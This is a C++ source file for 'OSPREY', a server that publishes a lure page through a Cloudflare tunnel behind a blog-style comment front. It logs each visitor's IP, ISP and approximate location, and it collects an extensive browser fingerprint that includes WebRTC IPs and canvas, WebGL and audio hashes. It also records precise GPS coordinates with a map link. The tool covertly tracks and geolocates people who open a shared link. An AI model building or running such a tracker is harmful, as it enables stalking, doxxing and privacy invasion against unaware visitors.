#include <iostream>
#include <string>
using namespace std;

#include <cstdlib> // Needed for system()
#include <thread>  // Needed for sleep_for
#include <chrono>  // Needed for time measurements

#include "httplib.h"
#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <regex>
#include <algorithm>
#include <cstdio>
#include <nlohmann/json.hpp>
#include <chrono>
#include <iomanip>
#include <sstream>

void clearScreen() {
    if (system("clear")) {
        // You can leave this empty, or add a fallback/error log if desired
    }
/*    
#ifdef _WIN32
    system("cls");   // Windows command
#else
    system("clear"); // Mac/Linux command
#endif
*/
};

const char* seahawk = R"(
     ===============================================
     ||                 O S P R E Y               ||
     ===============================================

                             /T /I
                            / |/ | .-~/
                        T\ Y  I  |/  /  _
       /T               | \I  |  I  Y.-~/
      I l   /I       T\ |  |  l  |  T  /
   T\ |  \ Y l  /T   | \I  l   \ `  l Y
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    "\\   7   7   ]
^.___~"--._    ~-{  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y   -=b-. _)
               (_/ .  \  :           / l      c"~o \
                \ /    `.    .     .^   \_.-~"~--.  )
                 (_/ .   `  /     /       !       )/
                  / / _.   '.   .':      /        '
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \          ,z=.
                    ~( /   '  :   | K   "-.-.~--. / (  \
                      "-,.    l   I/ \_    __{--->._(==.
                       //(     \  <    ~"~"     //
                      /' /\     \  \     ,v=.  ((
                    .^. / /\     "  }__ //===-  `
                   / / ' '  "-.,__ {---(==-
                 .^ '       :  T  ~"   ll       
                / .  .  . : | :!        \\
               (_/  /   | | j-"          ~^
                 ~-<_(_.^-~"
)";

const char* banner = R"(
     ██████╗     ███████╗    ██████╗     ██████╗     ███████╗    ██╗   ██╗    
    ██╔═══██╗    ██╔════╝    ██╔══██╗    ██╔══██╗    ██╔════╝    ╚██╗ ██╔╝    
    ██║   ██║    ███████╗    ██████╔╝    ██████╔╝    █████╗       ╚████╔╝     
    ██║   ██║    ╚════██║    ██╔═══╝     ██╔══██╗    ██╔══╝        ╚██╔╝      
    ╚██████╔╝    ███████║    ██║         ██║  ██║    ███████╗       ██║       
     ╚═════╝     ╚══════╝    ╚═╝         ╚═╝  ╚═╝    ╚══════╝       ╚═╝       
                                                                            
)";

using namespace std;
using json = nlohmann::json;

// ------------------- Helper functions -------------------

string read_html_file(const string& filepath) {
    ifstream file(filepath);
    if (!file.is_open()) return "";
    return string((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
}

string get_visitor_ip(const httplib::Request& req) {
    if (req.has_header("CF-Connecting-IP"))
        return req.get_header_value("CF-Connecting-IP");
    if (req.has_header("X-Forwarded-For"))
        return req.get_header_value("X-Forwarded-For");
    return req.remote_addr;
}

string get_user_agent(const httplib::Request& req) {
    return req.has_header("User-Agent") ? req.get_header_value("User-Agent") : "Unknown";
}

// Simple User-Agent parser (covers most common patterns)
struct UAParseResult {
    string browser, version, os, device;
};

UAParseResult parse_user_agent(const string& ua) {
    UAParseResult result;
    result.device = "Desktop";
    result.browser = "Unknown";
    result.version = "Unknown";
    result.os = "Unknown";

    if (ua.empty()) return result;

    // ─── OS detection (order matters) ──────────────────────
    if (ua.find("Windows NT") != string::npos) {
        result.os = "Windows";
        if (ua.find("Windows NT 10.0") != string::npos)      result.os += " 10";
        else if (ua.find("Windows NT 6.3") != string::npos)  result.os += " 8.1";
        else if (ua.find("Windows NT 6.2") != string::npos)  result.os += " 8";
        else if (ua.find("Windows NT 6.1") != string::npos)  result.os += " 7";
        else if (ua.find("Windows NT 6.0") != string::npos)  result.os += " Vista";
        else result.os += " (older)";
    }
    else if (ua.find("iPhone") != string::npos || ua.find("iPad") != string::npos) {
        result.os = "iOS";
        result.device = (ua.find("iPad") != string::npos) ? "Tablet" : "Mobile";
        regex ios_regex("OS ([0-9_]+)");
        smatch match;
        if (regex_search(ua, match, ios_regex)) {
            string ver = match[1].str();
            replace(ver.begin(), ver.end(), '_', '.');
            result.os += " " + ver;
        }
    }
    else if (ua.find("Android") != string::npos) {
        result.os = "Android";
        result.device = "Mobile";
        regex android_regex("Android ([0-9.]+)");
        smatch match;
        if (regex_search(ua, match, android_regex))
            result.os += " " + match[1].str();
        if (ua.find("Tablet") != string::npos || ua.find("SM-T") != string::npos)
            result.device = "Tablet";
    }
    else if (ua.find("Mac OS X") != string::npos) {
        result.os = "macOS";
        regex mac_regex("Mac OS X ([0-9_]+)");
        smatch match;
        if (regex_search(ua, match, mac_regex)) {
            string ver = match[1].str();
            replace(ver.begin(), ver.end(), '_', '.');
            result.os += " " + ver;
        }
    }
    else if (ua.find("CrOS") != string::npos) {
        result.os = "Chrome OS";
    }
    else if (ua.find("Linux") != string::npos) {
        result.os = "Linux";
    }

    // ─── Device type refinement ─────────────────────────────
    if (result.device == "Desktop") {
        if (ua.find("Mobile") != string::npos || ua.find("Android") != string::npos ||
            ua.find("iPhone") != string::npos || ua.find("iPad") != string::npos)
            result.device = "Mobile";
        if (ua.find("Tablet") != string::npos)
            result.device = "Tablet";
    }

    // ─── Browser detection – correct order ──────────────────
    // 1. Edge (must be first because it contains "Chrome" and "Safari")
    if (ua.find("Edg/") != string::npos) {
        result.browser = "Edge";
        regex edge_regex("Edg/([0-9.]+)");
        smatch match;
        if (regex_search(ua, match, edge_regex))
            result.version = match[1].str();
    }
    // 2. Opera (contains "Chrome" and "Safari")
    else if (ua.find("OPR/") != string::npos || ua.find("Opera") != string::npos) {
        result.browser = "Opera";
        regex opera_regex("OPR/([0-9.]+)");
        smatch match;
        if (regex_search(ua, match, opera_regex))
            result.version = match[1].str();
        else {
            regex opera_old("Opera/([0-9.]+)");
            if (regex_search(ua, match, opera_old))
                result.version = match[1].str();
        }
    }
    // 3. Firefox (does not contain "Chrome" or "Safari")
    else if (ua.find("Firefox/") != string::npos) {
        result.browser = "Firefox";
        regex ff_regex("Firefox/([0-9.]+)");
        smatch match;
        if (regex_search(ua, match, ff_regex))
            result.version = match[1].str();
    }
    // 4. Chrome (contains "Safari", but not Edge/Opera/Firefox)
    else if (ua.find("Chrome/") != string::npos) {
        result.browser = "Chrome";
        regex chrome_regex("Chrome/([0-9.]+)");
        smatch match;
        if (regex_search(ua, match, chrome_regex))
            result.version = match[1].str();
    }
    // 5. Safari (does not contain "Chrome", but does contain "Safari")
    else if (ua.find("Safari/") != string::npos) {
        result.browser = "Safari";
        regex safari_regex("Version/([0-9.]+)");
        smatch match;
        if (regex_search(ua, match, safari_regex))
            result.version = match[1].str();
        else
            result.version = "unknown";
    }
    else {
        result.browser = "Other";
    }

    return result;
}

// IP enrichment using ip-api.com (free, no key)
json enrich_ip(const string& ip) {
    json empty;
    if (ip.empty() || ip == "127.0.0.1" || ip == "::1")
        return empty;

    httplib::Client cli("http://ip-api.com");
    auto res = cli.Get("/json/" + ip + "?fields=status,country,regionName,city,isp,org,as,proxy,hosting");
    if (res && res->status == 200) {
        try {
            return json::parse(res->body);
        } catch (...) {}
    }
    return empty;
}

// Tunnel starter (unchanged)
void start_tunnel() {
    string cmd = "cloudflared tunnel --url http://127.0.0.1:8080 2>&1";
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return;

    char buffer[256];
    bool link_found = false;
    regex url_regex("https://[a-zA-Z0-9.-]+\\.trycloudflare\\.com");
    smatch match;

    cout << "\nRequesting Cloudflare tunnel..." << endl;

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        string line = buffer;
        if (!link_found && regex_search(line, match, url_regex)) {
            cout << "========================================" << endl;
            cout << "🌍 YOUR GLOBAL LIVE LINK IS READY:" << endl;
            cout << "👉  " << match.str(0) << endl;
            cout << "========================================\n" << endl;
            cout << "Waiting for visitors and comments...\n" << endl;
            link_found = true;
        }
    }
    pclose(pipe);
}

// ------------------- Main server -------------------

int main(){
    cout << seahawk << endl;
    // 2. Live Loading Animation
    const int total_steps = 40;
    const char spinner[] = {'|', '/', '-', '\\'};
    
    for (int i = 0; i <= total_steps; ++i) {
        // Calculate percentage
        int progress = (i * 100) / total_steps;
        
        // \r moves the cursor back to the start of the line
        cout << "\rLoading [";
        
        // Draw the progress bar
        for (int j = 0; j < total_steps; ++j) {
            if (j < i) cout << "=";
            else if (j == i) cout << ">";
            else cout << " ";
        }
        
        // Print percentage and spinner, use flush to force it to print immediately
        cout << "] " << progress << "% " << spinner[i % 4] << flush;
        
        // Pause for 75 milliseconds between each frame
        this_thread::sleep_for(chrono::milliseconds(75));
    }

    // 3. Clear the screen immediately after the bar finishes
    clearScreen();

    // 4. Print the final message
    cout << banner << endl;

    httplib::Server svr;

    svr.Get("/", [](const httplib::Request& req, httplib::Response& res) {
        string visitor_ip = get_visitor_ip(req);
        string ua = get_user_agent(req);

        cout << "\n[🌐 VISITOR ARRIVED]" << endl;
        cout << "├─ Public IP  : " << visitor_ip << endl;
        cout << "└─ User-Agent : " << ua << endl;

        string html = read_html_file("index.html");
        if (html.empty()) {
            res.status = 404;
            res.set_content("404: index.html not found", "text/plain");
        } else {
            res.set_content(html, "text/html");
        }
    });

    // Fingerprint endpoint – receives JSON from client
    svr.Post("/fingerprint", [](const httplib::Request& req, httplib::Response& res) {
        string body = req.body;
        if (body.empty()) {
            res.status = 400;
            res.set_content("Empty body", "text/plain");
            return;
        }

        try {
            json client_data = json::parse(body);

            // ---- Get visitor IP and User-Agent ----
            string ip = get_visitor_ip(req);
            string ua = get_user_agent(req);

            // ---- Enrich IP with geolocation & ISP ----
            json ip_info = enrich_ip(ip);
            bool is_proxy = false, is_hosting = false;
            string country, region, city, isp, org, asn;
            if (ip_info.contains("status") && ip_info["status"] == "success") {
                country = ip_info.value("country", "Unknown");
                region  = ip_info.value("regionName", "Unknown");
                city    = ip_info.value("city", "Unknown");
                isp     = ip_info.value("isp", "Unknown");
                org     = ip_info.value("org", "Unknown");
                asn     = ip_info.value("as", "Unknown");
                is_proxy = ip_info.value("proxy", false);
                is_hosting = ip_info.value("hosting", false);
            }

            // ---- Parse User-Agent ----
            UAParseResult ua_parsed = parse_user_agent(ua);

            // ---- Combine client and server data into one log ----
            cout << "\n═══════════════════════════════════════════════════" << endl;
            cout << "🔍 COMPLETE VISITOR FINGERPRINT" << endl;
            cout << "───────────────────────────────────────────────────" << endl;

            // 1. IP & Location
            cout << "IP Address                : " << ip << endl;
            cout << "Approx. Location          : " << city << ", " << region << ", " << country << endl;
            cout << "ISP                       : " << isp << endl;
            cout << "Organisation              : " << org << endl;
            cout << "ASN                       : " << asn << endl;
            cout << "Proxy detected?           : " << (is_proxy ? "YES" : "NO") << endl;
            cout << "Hosting/Cloud?            : " << (is_hosting ? "YES" : "NO") << endl;
            // Simple VPN/Tor detection (ip-api doesn't provide Tor directly, but we can note)
            // We can add a heuristic: if proxy=true or hosting=true, but that's not definitive.
            // We'll note that further detection could be done via IP reputation lists.
            cout << "VPN / Tor / Bot (approx.) : " << (is_proxy ? "Possible proxy/VPN" : "Likely residential") << endl;

            // 2. Browser & OS
            cout << "Browser Type              : " << ua_parsed.browser << endl;
            cout << "Browser Version           : " << ua_parsed.version << endl;
            cout << "Operating System          : " << ua_parsed.os << endl;
            cout << "Device Type               : " << ua_parsed.device << endl;
            cout << "Device Model              : " << (client_data.contains("deviceModel") ? client_data["deviceModel"].get<string>() : "Unknown") << endl;

            // 3. Screen & Display
            cout << "Screen Resolution         : " << client_data.value("screenWidth", 0) << "x" << client_data.value("screenHeight", 0) << endl;
            cout << "Screen Size (avail)       : " << client_data.value("screenAvailWidth", 0) << "x" << client_data.value("screenAvailHeight", 0) << endl;
            cout << "Color Depth               : " << client_data.value("colorDepth", 0) << " bits" << endl;

            // 4. Language & Time
            cout << "Language                  : " << client_data.value("language", "Unknown") << endl;
            cout << "Time Zone                 : " << client_data.value("timezone", "Unknown") << endl;
            cout << "System Locale             : " << client_data.value("systemLocale", "Unknown") << endl;

            // 5. URLs
            cout << "Referrer URL              : " << client_data.value("referrer", "None") << endl;
            cout << "Current URL               : " << client_data.value("currentURL", "Unknown") << endl;

            // 6. Browser Features (list from client)
            if (client_data.contains("browserFeatures")) {
                cout << "Browser Features          : " << client_data["browserFeatures"].dump() << endl;
            }

            // 7. Storage & Cookies
            cout << "Cookies enabled?          : " << (client_data.value("cookieEnabled", false) ? "YES" : "NO") << endl;
            cout << "Local Storage available?   : " << (client_data.value("localStorageAvailable", false) ? "YES" : "NO") << endl;
            cout << "Session Storage available? : " << (client_data.value("sessionStorageAvailable", false) ? "YES" : "NO") << endl;

            // 8. WebRTC
            if (client_data.contains("webRTCIPs")) {
                auto ips = client_data["webRTCIPs"];
                cout << "WebRTC Information        : [";
                for (size_t i=0; i<ips.size(); ++i) {
                    if (i>0) cout << ", ";
                    cout << ips[i];
                }
                cout << "]" << endl;
            }

            // 9. Network & Hardware
            cout << "Connection Type           : " << client_data.value("connectionType", "Unknown") << endl;
            cout << "Device Memory (GB)        : " << client_data.value("deviceMemory", 0.0) << endl;
            cout << "CPU Core Count            : " << client_data.value("hardwareConcurrency", 0) << endl;
            cout << "Touch Support             : " << (client_data.value("touchSupport", false) ? "YES" : "NO") << endl;

            // 10. Installed Fonts (limited)
            if (client_data.contains("installedFonts")) {
                cout << "Installed Fonts (sample)  : " << client_data["installedFonts"].dump() << endl;
            }

            // 11. Fingerprints
            cout << "Canvas Fingerprint        : " << client_data.value("canvasFingerprint", "Not collected") << endl;
            cout << "WebGL Fingerprint         : " << client_data.value("webGLVendor", "Not collected") << " / " << client_data.value("webGLRenderer", "Not collected") << endl;
            cout << "Audio Fingerprint         : " << client_data.value("audioFingerprint", "Not collected") << endl;

            // 12. Privacy & Permissions
            cout << "Do Not Track              : " << client_data.value("doNotTrack", "unspecified") << endl;
            if (client_data.contains("permissions")) {
                cout << "Browser Permissions       : " << client_data["permissions"].dump() << endl;
            }

            // 13. Tracking Identifiers (if any)
            cout << "Tracking Identifiers      : " << client_data.value("trackingIdentifiers", "None") << endl;
            cout << "Advertising Identifiers   : " << client_data.value("advertisingIdentifiers", "Not accessible via web") << endl;
            cout << "Analytics Identifiers     : " << client_data.value("analyticsIdentifiers", "None") << endl;

            // 14. Combined Device/Browser Fingerprint
            cout << "Device Fingerprint        : " << client_data.value("fingerprintHash", "N/A") << endl;
            cout << "Browser Fingerprint       : " << client_data.value("browserFingerprintHash", "N/A") << endl;

            cout << "───────────────────────────────────────────────────" << endl;
            cout << "✅ All data logged successfully.\n" << endl;

            res.set_content("OK", "text/plain");

        } catch (const json::parse_error& e) {
            res.status = 400;
            res.set_content("Invalid JSON", "text/plain");
        }
    });

    // --- INSERT THIS GEOLOCATION BLOCK ---
    svr.Post("/track_location", [](const httplib::Request& req, httplib::Response& res) {
        if (req.has_param("latitude") && req.has_param("longitude")) {
            string lat = req.get_param_value("latitude");
            string lon = req.get_param_value("longitude");
            string acc = req.has_param("accuracy") ? req.get_param_value("accuracy") : "Unknown";
            
            cout << "\n[📍 PRECISE LOCATION ACQUIRED]" << endl;
            cout << "├─ Latitude   : " << lat << endl;
            cout << "├─ Longitude  : " << lon << endl;
            cout << "├─ Accuracy   : Within " << acc << " meters" << endl;
            cout << "└─ Google Map : https://www.google.com/maps?q=" << lat << "," << lon << "\n" << endl;
        }
        res.set_content("OK", "text/plain");
    });
    // -------------------------------------

    // Comment endpoint (unchanged – kept for the blog feature)
    svr.Post("/comment", [](const httplib::Request& req, httplib::Response& res) {
        string visitor_ip = get_visitor_ip(req);
        string user_agent = get_user_agent(req);

        if (req.has_param("username") && req.has_param("message")) {
            string user = req.get_param_value("username");
            string msg = req.get_param_value("message");

            cout << "\n========================================" << endl;
            cout << "[💬 NEW COMMENT]" << endl;
            cout << "AUTHOR    : " << user << endl;
            cout << "PUBLIC IP : " << visitor_ip << endl;
            cout << "DEVICE    : " << user_agent << endl;
            cout << "MESSAGE   : " << msg << endl;
            cout << "========================================\n" << endl;

            res.set_content("Success", "text/plain");
        } else {
            res.status = 400;
            res.set_content("Bad Request", "text/plain");
        }
    });

    // Start tunnel
    thread tunnel_thread(start_tunnel);
    tunnel_thread.detach();

    if (!svr.listen("127.0.0.1", 8080)) {
        cerr << "[ERROR] Server failed to start on port 8080." << endl;
    }

    return 0;
}